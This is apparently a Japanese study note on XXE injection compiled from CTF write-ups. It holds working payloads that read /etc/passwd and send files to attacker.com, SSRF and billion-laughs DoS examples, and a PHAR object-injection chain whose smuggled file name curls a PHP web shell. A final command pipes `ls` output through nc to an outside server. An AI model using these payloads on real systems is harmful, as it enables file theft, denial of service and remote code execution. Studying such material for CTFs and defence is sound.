<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [XXE Injection](#xxe-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [例](#%E4%BE%8B)
    - [LFI](#lfi)
    - [Blind LFI](#blind-lfi)
    - [SSRF](#ssrf)
    - [DOS](#dos)
- [writeup](#writeup)
  - [OOB XXE (obtain index.php / indentify webshell's fullpath)](#oob-xxe-obtain-indexphp--indentify-webshells-fullpath)
  - [OOB XXE (SSRF / 二重XXE)](#oob-xxe-ssrf--%E4%BA%8C%E9%87%8Dxxe)
  - [XXE (normal XXE / identify webroot or /proc/self/cwd)](#xxe-normal-xxe--identify-webroot-or-procselfcwd)
  - [XXE (normal XXE / upload XMLfile)](#xxe-normal-xxe--upload-xmlfile)
  - [XXE (normal XXE / request XMLfile's URL)](#xxe-normal-xxe--request-xmlfiles-url)
  - [XXE (SVG XXE / identify fullpath as /proc/self/cwd/flag.txt)](#xxe-svg-xxe--identify-fullpath-as-procselfcwdflagtxt)
  - [OOB XXE (create DTDfile into server / DNS SubDomain)](#oob-xxe-create-dtdfile-into-server--dns-subdomain)
  - [OOB XXE (SVG XXE / upload PHARfile / PHP Object Injection to OS Command Injection)](#oob-xxe-svg-xxe--upload-pharfile--php-object-injection-to-os-command-injection)
  - [(OOB) XXE (SSRF to localhost / Command Injection)](#oob-xxe-ssrf-to-localhost--command-injection)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# XXE Injection
## 概要

以下のようなXML形式でのリクエストがある場合、   
```txt
POST http://example.com/xml HTTP/1.1

<foo>
Hello World
</foo>
```
改竄して以下を送信することで、応答にリクエストの結果が返される場合は`/etc/passwd`が得られる！   
```txt
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
これはXMLの`<!ENTITY `タグで内部または外部にあるデータ(エンティティ)を挿入できることができるような`DTD`構文を使った機能が原因。   
`<!DOCTYPE`内がDTD。   
`<!ELEMENT foo ANY>`が構造の定義で、`<!ENTITY `からが実体宣言。DTDでは構造定義と実体宣言を行う必要があるっぽい。   
内部エンティティは`<!ENTITY test "aaaa">`みたいに定義する。   
外部エンティティは`<!ENTITY xxe SYSTEM "file:///etc/passwd">`みたいに`SYSTEM`を使って実体参照を行う。   
   
この脆弱性を防ぐにはDTD構文を使った実体参照の機能を禁止する必要があるらしい。   
ローカルでこれを再現すると以下の通り。  
`simplexml_load_string($_POST['data'], 'SimpleXMLExtended', LIBXML_NOCDATA);`のうち第三引数が`LIBXML_NOENT`になってないと実体参照はできないらしい。でもPHPのコンパイルオプションによっては第一引数だけで実体参照できたりすることもあるらしい。  
https://www.php.net/manual/ja/libxml.constants.php  
https://qiita.com/prograti/items/82409213bb875540a52e  
```txt
takabayashi@takabayashi-VirtualBox:/var/www/html$ php -a
Interactive mode enabled

php > $string = <<<XML
<<< > <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<<< > <!DOCTYPE dummy [ 
<<< > <!ELEMENT t ANY >
<<< > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<<< > XML;
php >
php > print_r(simplexml_load_string($string,'SimpleXMLElement', LIBXML_NOENT));
SimpleXMLElement Object
(
    [0] => root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
// 以下略

)
php >
```
## 例
### LFI
XMLを解析した結果をアプリケーションが返してくれる時。   
```txt
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```
上記だと`<`とかの特殊文字の入ったファイルは実体参照の後XML構文として解析されてしまって攻撃リクエストが壊れるので、そういう時はパラメータエンティティという手法を使える。   
https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/   

```txt
POST http://example.com/xml HTTP/1.1

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>


// attacker.com/evil.dtd
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```
また、対象がPHPアプリケーションの場合、Base64エンコードすることでも可能！これならバイナリファイルも読み取れる。   
```txt
POST http://example.com/xml.php HTTP/1.1

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>
<foo>
  &bar;
</foo>
```
### Blind LFI
結果がわからないときはBlindみたいにして、攻撃者の用意したサーバーにアクセスさせるしかない。   
```txt
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```
### SSRF
外からはアクセスできないIPアドレスとかにアクセスさせることができる。   
```txt
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```
### DOS
```txt
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
# writeup
## OOB XXE (obtain index.php / indentify webshell's fullpath)
https://github.com/shvetsovalex/ctf/tree/master/2018/VolgaCTF-quals/Shop%20quest   
- **entrypoint**   
製品情報をXML形式で保存するのでXXEに脆弱かも？と考える。   
- **概要**   
webshellはアップできていてもそのフルパスがわからない。その時に`index.php`をOOB XXEで閲覧してソースを読んでファイルパスを特定する。   
- **Payload**   
```txt
// 多分これをPOSTするかんじ
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker.com/oob.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

// oob.xml   (これは攻撃者サーバーにセット)
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
```
## OOB XXE (SSRF / 二重XXE)
https://qiita.com/no1zy_sec/items/03b8f335e84995fec3e3   
- **entrypoint**   
問題文が`xmlvalidator`だからXXEを疑う？   
- **概要**   
ローカルネットワークからしかアクセスできないので別のXMLの問題のページからXXEでページを読み込む(ソースではない)   
`loadxml`に`$_REQUEST['xml']`の内容が入るのでまたXXE脆弱。応答を返さないのでOOB XXEで攻撃者サーバーにアクセスさせる。      
- **Payload**   
```txt
// 別の問題ページから送信する内容　（2重にXXEしてる）
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/convert.base64-encode/resource=http://xmlvalidator/?xml=%3C%21DOCTYPE+root+%5B%3C%21ELEMENT+root+ANY+%3E%3C%21ENTITY+%25+xxe+SYSTEM+%22https%3A%2F%2Fexample.com%2Fxxe.dtd%22%3E%25xxe%3B%5D%3E%3Croot%3E%26startme%3B%3Croot%3E">
]>
<foo>
  &bar;
</foo>


// xxe.dtd (攻撃者サーバーに用意する)
<!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=flag.php">
<!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/xxxxxxx?xxe=%filebase64;">'>%injme;
```
## XXE (normal XXE / identify webroot or /proc/self/cwd)
https://www.aquablog.site/entry/2019/03/25/093034   

- **entrypoint**   
IndexページのJavascriptのソースコード内にJavascriptでXML形式のデータをXMLHttpRequestで送信して、返ってきたデータを`.innerHTML`に入れて表示する。ここからXXEを疑う。   
- **概要**   
応答が返ってくるので普通のXXE。flagのフルパスがわからないので`file:///etc/nginx/sites-enabled/default`でNginxのWebルートを特定するか、`file:///proc/self/cwd/`,`php://filter`とかでflagファイルをゲットできるらしい。   
- **Payload**   
```txt
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///var/www/html/epreuve/flag" >]><feedback><author>&xxe;</author><email>a</email><content>undefined</content></feedback>
```
## XXE (normal XXE / upload XMLfile)
https://st98.github.io/diary/posts/2017-04-03-nuit-du-hack-ctf-quals-2017.html   
- **entrypoint**   
CSVをHTMLに変換できるWebサービスが稼働しており、CSVファイルをアップロードするとHTMLに変換されるので、XMLデータを送信してみる。すると、`Could not convert the CSV to XML!`というエラーが表示されるのでXMLが解析されており(?)XXE脆弱と疑う。   
- **概要**   
応答が返ってくるので普通のXXEでよい。   
- **Payload**   
```txt
// 以下のファイルをアップロードする。(fullpahをなぜ知ってるのかは謎)
<!DOCTYPE hoge [ <!ENTITY xxe SYSTEM "/home/flag/flag"> ]>
id,name,email
a,b,&xxe;
```
## XXE (normal XXE / request XMLfile's URL)
https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/   
- **entrypoint**   
`Show stored data`というページを見るとどうやらURLに`?xml=`があるっぽくて、`?xml=aaa`とかにするとページにエラーが表示される。　`file_get_contents(aaa)`,`DOMDocument::loadXML()`,`simplexml_import_dom()`とかの関数がエラー吐いてるのが見えるのでXXEとわかる。   
- **概要**   
`Show stored data`というページ、ということは応答が返ってくるということなので普通のXXE。   
- **Payload**   
```txt
// これを攻撃者サーバーに待機させて、 ?xml=http://attack.com/xxe.txtとかをリクエストする
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
    <data>&xxe;</data>
</root>
```
## XXE (SVG XXE / identify fullpath as /proc/self/cwd/flag.txt)
https://www.rootnetsec.com/bsidessf-svgmagick/   
- **entrypoint**   
`When I render SVGs to PNGs, it's like magic!`というヒントからSVGのXXEだと疑う。   
- **概要**   
普通のSVGのXXE。応答が返ってくる。`file://flag.txt`だと500エラーとなってしまうため`proc/self/cwd`を使うらしい。      
- **Payload**   
```txt
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
## OOB XXE (create DTDfile into server / DNS SubDomain)
https://graneed.hatenablog.com/entry/2019/11/11/081011   

- **entrypoint**   
`index.php`のソースコードが与えられてその中で`loadXML`の中に`$_POST['content']`が入っているのでXXEと疑う。結果が返ってこないのでOOB XMLとわかる。   
- **概要**   
OOB XXEにはDTDファイルが必要だが今回はIptablesによって外部への通信がDNS以外ブロックされるため、入力データを`/tmp`に保存していることを利用してサーバー内にDTDファイルを作成する。DTDファイルは拡張子は何でも良さそう(.htmlでも)。   
   
リークさせる通信も53ポート以外は使えないので、DNSのサブドメインへのクエリを確認できるドメインを払い出す`DNSBin`というツールを使って`51a19e650babb6f295ed.d.zhack.ca`みたいなサブドメインを求めて、攻撃者サーバー53ポートでリッスンする。   
そして、DTDファイルを作成した後に、それを参照するようなXXE Payloadを送信する。   

- **Payload**   
```txt
// <!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.51a19e650babb6f295ed.d.zhack.ca/'>">
%all;
// このDTDファイルを作成するためのリクエスト
$ curl http://167.71.102.84/index.php -d "content=%3C%21ENTITY+%25+all+%22%3C%21ENTITY+send+SYSTEM+%27http%3A%2F%2F%25file%3B.51a19e650babb6f295ed.d.zhack.ca%2F%27%3E%22%3E%0D%0A%25all%3B" -v


// 二回目のこのリクエストで攻撃者の53ポートにフラグ付きのリクエストが送信されてくる(SSRF)
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/flag">
  <!ENTITY % dtd SYSTEM "/tmp/5e870399feeb3947c7f6c27b3ee0d71e.html">
  %dtd;
]>
<data>&send;</data>
```
## OOB XXE (SVG XXE / upload PHARfile / PHP Object Injection to OS Command Injection)
https://jbz.team/midnightsunctfquals2019/Rubenscube   
- **entrypoint**   
得られたソースコード内に`loadXML`,`svg`というキーワードがあり、送信を許可されているMIMEタイプが`image/png image/jpeg image/svg+xml`の３つしかない(xml形式で送信できない！)のでSVG XXEとわかる。応答は返されないのでOOB XXEとわかる。   
- **概要**   
ソースコードを見るとOOB SVG XXEとわかり、SVGファイルをアップロードすればよいが、flagファイルのフルパスがどこかわからない。ここで、`jpeg`とかも許可されており、`Image`クラスで`__destruct()`で以下を呼び出すのでpharでのPHP Object Injectionが可能！(アップされたpharを保存するフルパスはソースからわかる！)   
`system()`のなかで`$this->folder`とかを任意の値に変えられるのでOS Command Injectionが可能！   
```php
    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
```
- **Payload**   
本来は以下でflagを見ればよいが、今回はフラグのあるフルパスがどうしてもわからないのでRCEする必要がある。これはとりあえず`/etc/passwd`を見れるってかんじ。   
```txt
// これをsvgファイルとしてアップロードする
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://jbz.team/evil.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>


// evil.xml (攻撃者サーバーに用意する)
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://jbz.team/%data;'>">
```
以下でアップロードするための`phar`ファイルを作成する。   
```php
<?php
class Image {}

$jpeg_header_size = 
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
$object = new Image;
$object->tmp_name = '/etc/passwd';
$object->folder = '/tmp';
$object->file_name = 'aaa`curl jbz.team/phpshell.txt > /var/www/html/images/<phpsessid>/a.php`bbb';
$object->extension = 'txt';
$phar->setMetadata($object);
$phar->stopBuffering();
```
以下のXXEで上記の`phar`ファイルを読み込ませて、メタデータをunserializeさせてPHP Object Injectionを起こしてRCEする！   
```txt
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % data SYSTEM "phar://images/<phpsessid>/<phar_file_name>.jpg">
%data;
]>
<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="60" y="15" style="fill:black">PoC for XXE file stealing via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara></flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```
## (OOB) XXE (SSRF to localhost / Command Injection)
https://graneed.hatenablog.com/entry/2019/01/28/023500   
- **entrypoint**   
ソースコードが与えられて`Admin::sort($_REQUEST['rss'],$_REQUEST['order'])`にRCEの脆弱性があることがわかるが、ローカルからしかアクセスできないように制限されている。なので、XXEを使ってSSRFによってリクエストを送信してRCEする。幸い、`simplexml_load_string`に入力が入っているのでXXEに対して脆弱。   
応答が返ってこないが今回はSSRFをするだけでよくて、コンテンツを攻撃者サーバーに送り付ける必要がないため、SSRFでよい。   
- **概要**   
以下がXXEに脆弱な箇所。   
```php
class Custom extends Controller{
  public static function Test($string){
      $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
      $test = $root->name;
      echo $test;
  }
```
以下の`usort`の部分が、第1引数に配列、第二引数にコールバック関数を指定しており、後者は`create_function`によって無名関数が文字列`''`で囲まれて宣言されている。ここに`aa||system('id')`を挿入可能なのでCommand Injection可能。   
```php
class Admin extends Controller{
  public static function sort($url,$order){
    $uri = parse_url($url);
    $file = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);
    $xml = simplexml_import_dom($dom);
    if($xml){
     //echo count($xml->channel->item);
     //var_dump($xml->channel->item->link);
     $data = [];
     for($i=0;$i<count($xml->channel->item);$i++){
       //echo $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link."\n";
       $data[] = new Url($i,$uri['scheme'].'://'.$uri['host'].$xml->channel->item[$i]->link);
       //$data[$i] = $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link;
     }
     //var_dump($data);
     usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
     echo '<div class="ui list">';
     foreach($data as $dt) {
       $html = '<div class="item">';
       $html .= ''.$dt->id.' - ';
       $html .= ' <a href="'.$dt->link.'">'.$dt->link.'</a>';
       $html .= '</div>';
     }
     $html .= "</div>";
     echo $html;
    }else{
     $html .= "Error, not found XML file!";
     $html .= "<code>";
     $html .= "<pre>";
     $html .= $file;
     $html .= "</pre>";
     $hmlt .= "</code>";
     echo $html;
    }
  }
}
```
- **Payload**   
以下のXMLファイルを攻撃者サーバーに用意しておく。これは`usort`関数が実行されるようにするため。   
```txt
<root>
<channel>
<item><link>aaa</link></item>
<item><link>bbb</link></item>
</channel>
</root>
```
以下でRCE！   
```txt
curl "http://68.183.31.62:94/custom" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin?rss=http://<myserver>/hoge.xml&order=hoge%7C%7Csystem%28%27ls%7Cnc%20<myserver>%2012345%27%29" >]><foo>&xxe;</foo>'
```
# メモ
`hackerone report xxe`とかでググるといろいろ出てくる。   
`xxe ctf`,`xxe vulnhub`,`xxe hackthebox`とか。   
応答が返ってくるかで、普通のXXEかOOB XXEかが判別できそう。   
  
https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club  
writeup todo  
# 参考
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md   
チートシート   
https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/   
わかりやすい解説   
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing   

OWASPの説明   
https://portswigger.net/web-security/xxe#:~:text=XML%20external%20entity%20injection%20(also,application's%20processing%20of%20XML%20data.   
わかりやすそうな説明。   
https://yamory.io/blog/what-is-xxe/   
日本語の説明   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe   
PayloadAllThings
https://phonexicum.github.io/infosec/xxe.html#exploitation-ways   
いろいろまとまっててよさげ   
